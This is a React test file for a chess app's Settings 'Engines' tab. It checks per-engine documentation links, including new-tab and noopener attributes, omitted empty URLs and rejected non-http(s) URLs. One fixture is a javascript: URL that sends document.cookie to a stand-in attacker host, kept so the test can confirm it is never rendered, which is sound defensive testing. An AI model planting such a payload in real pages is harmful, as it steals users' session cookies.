// @vitest-environment jsdom
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, cleanup, within } from '@testing-library/react';
import { MemoryRouter, Routes, Route } from 'react-router';
import '@testing-library/jest-dom/vitest';
import { Settings } from './Settings';
import type { EngineDefinition } from '../types/game';
import menuSchemaFixture from '../test/fixtures/menuSchema';

/**
 * Guards the per-engine "learn more" link on the Engines tab.
 *
 * Why these tests exist: an engine card asks the user to install a binary on the
 * device while describing it in two short strings, so each card links to the
 * engine's project page. The URL is resolved server-side from the catalog
 * (`info_url` on GET /api/engines/all), so this page holds no table of engine
 * URLs. How a regression manifests: the anchor disappears from the card, carries
 * another engine's URL, or -- since the value arrives as data -- renders a
 * non-http(s) href that would execute script in the page's origin.
 */

const menuSchema: unknown = menuSchemaFixture;

const BERSERK_INFO_URL = 'https://github.com/jhonnold/berserk';
const STOCKFISH_INFO_URL = 'https://stockfishchess.org';
// A malformed catalog/payload value: as an href this would run in the settings
// page's origin, so it must never reach the DOM.
const SCRIPT_URL = 'javascript:fetch("//attacker.test/"+document.cookie)';

const idleEngineStatus = {
  active: false, installing: false, engine: null, display_name: null,
  stage: null, message: '', percent: 0, interrupted: false, result: null,
};

interface JsonResponseLike {
  ok: boolean;
  status: number;
  json: () => Promise<unknown>;
  text: () => Promise<string>;
}

function jsonResponse(body: unknown, status = 200): JsonResponseLike {
  return { ok: status >= 200 && status < 300, status, json: async () => body, text: async () => JSON.stringify(body) };
}

class MockEventSource {
  url: string;
  constructor(url: string) {
    this.url = url;
  }
  close(): void {}
  addEventListener(): void {}
  removeEventListener(): void {}
}

function engine(overrides: Partial<EngineDefinition>): EngineDefinition {
  return {
    name: 'placeholder',
    display_name: 'Placeholder',
    description: 'desc',
    summary: 'summary',
    info_url: '',
    installed: false,
    has_prebuilt: false,
    estimated_install_minutes: 0,
    has_profiles: false,
    profiles_ready: false,
    last_failure: null,
    needs_repair: false,
    can_repair: false,
    missing_net_count: 0,
    supported: true,
    unsupported_reason: null,
    source_installable: true,
    recommended_ref: null,
    installed_ref: null,
    resume_point: null,
    ...overrides,
  };
}

const engines: EngineDefinition[] = [
  engine({ name: 'stockfish', display_name: 'Stockfish', installed: true, info_url: STOCKFISH_INFO_URL }),
  engine({ name: 'berserk', display_name: 'Berserk', info_url: BERSERK_INFO_URL }),
  // A bundled novelty engine: no upstream project, so the backend sends no link.
  engine({ name: 'worstfish', display_name: 'Worstfish', info_url: '' }),
  engine({ name: 'sneakyfish', display_name: 'Sneakyfish', info_url: SCRIPT_URL }),
];

beforeEach(() => {
  vi.stubGlobal(
    'fetch',
    vi.fn(async (url: string): Promise<JsonResponseLike> => {
      if (url === '/api/menu-schema') return jsonResponse(menuSchema);
      if (url === '/api/settings') {
        return jsonResponse({
          PlayerOne: { type: 'human', name: '', engine: 'stockfish', elo: 'Default', hand_brain_mode: 'normal' },
          PlayerTwo: { type: 'engine', name: '', engine: 'stockfish', elo: 'Default', hand_brain_mode: 'normal' },
          game: { time_control: '0', analysis_mode: 'True', analysis_engine: 'stockfish', notation: 'figurine', coach_provider: 'none', coach_id: 'off' },
          lichess: { api_token: '', range: '' },
          sound: {}, system: { inactivity_timeout: '900' }, DATABASE: { database_uri: '' },
        });
      }
      if (url === '/api/engines/all') return jsonResponse(engines);
      if (url === '/api/sprites') return jsonResponse(['default']);
      if (url === '/api/agents') return jsonResponse({ agents: [] });
      if (url === '/api/engines/status') return jsonResponse(idleEngineStatus);
      if (url.startsWith('/api/coaches')) return jsonResponse({ coaches: [], resolved: null });
      if (url.startsWith('/api/coach/models')) return jsonResponse({ models: [] });
      return jsonResponse({});
    })
  );
  vi.stubGlobal('EventSource', MockEventSource);
});

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
  vi.clearAllMocks();
});

function renderEnginesTab() {
  return render(
    <MemoryRouter initialEntries={['/settings/engines']}>
      <Routes>
        <Route path="/settings/:tab" element={<Settings />} />
      </Routes>
    </MemoryRouter>
  );
}

async function findEngineCard(displayName: string): Promise<HTMLElement> {
  const title = await screen.findByText(displayName);
  const card = title.closest('.engine-card');
  if (!card) throw new Error(`Engine card for ${displayName} not found`);
  return card as HTMLElement;
}

describe('Engines tab documentation links', () => {
  it.each([
    ['Stockfish', STOCKFISH_INFO_URL],
    ['Berserk', BERSERK_INFO_URL],
  ])('links the %s card to the URL the backend resolved', async (displayName, expectedUrl) => {
    // Scoped to the card so the link is proven to belong to that engine: a
    // regression rendering one engine's info_url on every card would pass a
    // page-wide query but fail here on the second engine.
    renderEnginesTab();
    const card = await findEngineCard(displayName);

    const link = within(card).getByRole('link', { name: `Learn more about ${displayName}` });
    expect(link).toHaveAttribute('href', expectedUrl);
    // Outbound link: new tab, and no window.opener handle back into this page.
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('renders one link per engine that has a URL, and none for the others', async () => {
    // Counting catches drift in both directions: a dropped card link (fewer) and a
    // link rendered for an engine with no/unusable URL (more). Two of the four
    // mocked engines carry a usable link.
    renderEnginesTab();
    await findEngineCard('Stockfish');

    const links = screen.getAllByRole('link', { name: /^Learn more about / });
    expect(links.map((link) => link.getAttribute('href'))).toEqual([
      STOCKFISH_INFO_URL,
      BERSERK_INFO_URL,
    ]);
  });

  it('omits the link for an engine with no documentation URL', async () => {
    // The bundled novelty engines have no upstream page; their card must render
    // normally with the link absent. Failure mode: an empty info_url rendering an
    // href="" anchor that reloads the settings page when clicked.
    renderEnginesTab();
    const card = await findEngineCard('Worstfish');

    expect(
      within(card).queryByRole('link', { name: 'Learn more about Worstfish' })
    ).not.toBeInTheDocument();
  });

  it('refuses to render a non-http(s) documentation URL as a link', async () => {
    // Security: the URL arrives as payload data, and the browser treats a
    // `javascript:` href as executable in this page's origin, so such a value must
    // be dropped rather than rendered. Failure manifests as the anchor existing
    // (and the script URL appearing in the DOM).
    renderEnginesTab();
    const card = await findEngineCard('Sneakyfish');

    expect(
      within(card).queryByRole('link', { name: 'Learn more about Sneakyfish' })
    ).not.toBeInTheDocument();
    expect(document.body.innerHTML).not.toContain('attacker.test');
  });
});
